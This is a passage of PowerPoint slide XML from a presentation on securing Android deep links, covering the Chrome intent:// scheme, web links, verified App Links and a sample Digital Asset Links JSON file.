            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>This way, only </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>your app package</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t> receives it—no other app can hijack.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>But downside: requires browser support, not a universal Android solution.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="TextBox 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1F108A11-A842-6EF7-8D73-E228AA9F8EA3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3030583" y="609826"/>
            <a:ext cx="6361612" cy="584775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Chrome intent:// Scheme</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="2" name="Picture 1" descr="A blue background with white text&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{06F7EFBF-39A2-436A-C006-D155C8957543}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="10881558" y="0"/>
            <a:ext cx="1310441" cy="584200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="20815962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BAB1E-45CB-61CB-8423-4AA502F2FC0E}"/>
            </a:ext>
          </a:extLst>
        </p:cNvPr>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 2" descr="Linking with Confidence: Securing Deep Links in Android Applications">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0628EE92-B234-640C-0EBC-AFF4AD7567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573645"/>
            <a:ext cx="7914290" cy="590598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831A164-20DB-9F4B-92EE-A5059CC4BE36}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6593082" y="1524401"/>
            <a:ext cx="4924697" cy="584775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Web Links (HTTP / HTTPS)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="TextBox 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9040FED4-0033-B8A6-1D53-AB730B5DE36A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5893559" y="2293878"/>
            <a:ext cx="6298440" cy="3970318"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Format: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://example.com/page</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>On Android 12 and higher, clicking a web link </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>always shows content in a web browser</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>On devices running previous versions of Android, if your app or other apps installed on a user's device can also handle the web link, users might not go directly to the browser. Instead, they'll see a disambiguation dialog similar to picture.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Handled by apps </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" i="1" dirty="0"/>
              <a:t>and</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> browsers.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Safer than deep links because they use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>standard web URLs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Still, if multiple apps handle the same host, the system asks the user → </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>not guaranteed secure</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="2" name="Picture 1" descr="A blue background with white text&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{023EDD76-0467-407F-19F0-DF0CB2395FB1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="10881558" y="0"/>
            <a:ext cx="1310441" cy="584200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="278058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179A8-0679-9A4D-82B8-9908DB0818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122947-2BEA-4BB8-873B-2041D801D4C5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4130566" y="1671387"/>
            <a:ext cx="8292662" cy="584775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Android App Links (Verified Web Links)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="TextBox 10">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{319D72D3-229A-46C7-4EF6-42337C8E82C9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4130566" y="2795434"/>
            <a:ext cx="7906406" cy="2862322"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="ü"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>Format: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>https://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>example.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>/page</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="ü"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>Special type of web link with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>android:autoVerify</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>="true".</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="ü"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>Android checks a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>Digital Asset Links JSON file</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t> on your server to verify your app really owns the domain.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="ü"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>Once verified:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900">
              <a:buFont typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:buChar char="o"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>Links open </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>directly in your app</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t> without asking the user.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900">
              <a:buFont typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:buChar char="o"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>Cannot be hijacked by other apps.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="ü"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>Best for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>login flows, payments, secure actions</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5132" name="Picture 12" descr="App Links in Xamarin Forms - Xamboy">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{353ED03E-7392-AE64-324B-CCC1F02D77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7719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blue background with white text&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E5D08C43-204A-5BBE-7218-0E63A6DCAE63}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="10881558" y="0"/>
            <a:ext cx="1310441" cy="584200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2328869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2026F6-6DC1-711D-7A9D-D3EB2C596C51}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5940972" y="3429000"/>
            <a:ext cx="6096000" cy="1754326"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFF00"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Android needs a way to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>prove</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> that:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Your app (say </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>com.example.myapp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>) really belongs to you.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>And your website (https://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>example.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>) also belongs to you.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>So Android requires both sides to "shake hands" via a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Digital Asset Links JSON file</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="TextBox 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DF015607-D05B-7EE8-A345-E30BF762ED39}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="155028" y="889843"/>
            <a:ext cx="12036972" cy="5693866"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>On your website:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>You put a file named </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>assetlinks.json</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t> inside:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>https://example.com/.well-known/assetlinks.json</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:highlight>
                  <a:srgbClr val="00FFFF"/>
                </a:highlight>
              </a:rPr>
              <a:t>[{</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:highlight>
                  <a:srgbClr val="00FFFF"/>
                </a:highlight>
              </a:rPr>
              <a:t>  "relation": ["</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:highlight>
                  <a:srgbClr val="00FFFF"/>
                </a:highlight>
              </a:rPr>
              <a:t>delegate_permission</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:highlight>
                  <a:srgbClr val="00FFFF"/>
                </a:highlight>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:highlight>
                  <a:srgbClr val="00FFFF"/>
                </a:highlight>
              </a:rPr>
              <a:t>common.handle_all_urls</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:highlight>
                  <a:srgbClr val="00FFFF"/>
                </a:highlight>
              </a:rPr>
              <a:t>"],</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:highlight>
                  <a:srgbClr val="00FFFF"/>
                </a:highlight>
              </a:rPr>
              <a:t>  "target": {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:highlight>
                  <a:srgbClr val="00FFFF"/>
                </a:highlight>
              </a:rPr>
              <a:t>    "namespace": "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:highlight>
                  <a:srgbClr val="00FFFF"/>
                </a:highlight>
              </a:rPr>
              <a:t>android_app</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:highlight>
                  <a:srgbClr val="00FFFF"/>
                </a:highlight>
              </a:rPr>
              <a:t>",</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:highlight>
                  <a:srgbClr val="00FFFF"/>
                </a:highlight>
              </a:rPr>
              <a:t>    "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:highlight>
                  <a:srgbClr val="00FFFF"/>
                </a:highlight>
              </a:rPr>
              <a:t>package_name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:highlight>
                  <a:srgbClr val="00FFFF"/>
                </a:highlight>
              </a:rPr>
              <a:t>": </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:highlight>
                  <a:srgbClr val="00FFFF"/>
                </a:highlight>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:highlight>
                  <a:srgbClr val="00FFFF"/>
                </a:highlight>
              </a:rPr>
              <a:t>com.example.myapp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:highlight>
                  <a:srgbClr val="00FFFF"/>
                </a:highlight>
              </a:rPr>
              <a:t>",</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:highlight>
                  <a:srgbClr val="00FFFF"/>
                </a:highlight>
              </a:rPr>
              <a:t>    "sha256_cert_fingerprints": [</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:highlight>
                  <a:srgbClr val="00FFFF"/>
                </a:highlight>
              </a:rPr>
              <a:t>      </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:highlight>
                  <a:srgbClr val="00FFFF"/>
                </a:highlight>
              </a:rPr>
              <a:t>"12:34:56:78:90:AB:CD:EF:..."</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:highlight>
                  <a:srgbClr val="00FFFF"/>
                </a:highlight>
              </a:rPr>
              <a:t>    ]</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:highlight>
                  <a:srgbClr val="00FFFF"/>
                </a:highlight>
              </a:rPr>
              <a:t>  }</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:highlight>
                  <a:srgbClr val="00FFFF"/>
                </a:highlight>
              </a:rPr>
              <a:t>}]</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>package_name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t> → Your app’s package.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>sha256_cert_fingerprints </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>→ The SHA-256 fingerprint of your app’s signing certificate (proves authenticity).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="2" name="Picture 1" descr="A blue background with white text&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8E57B384-0476-CCA1-BE33-84D27027F046}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="10881558" y="0"/>
            <a:ext cx="1310441" cy="584200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
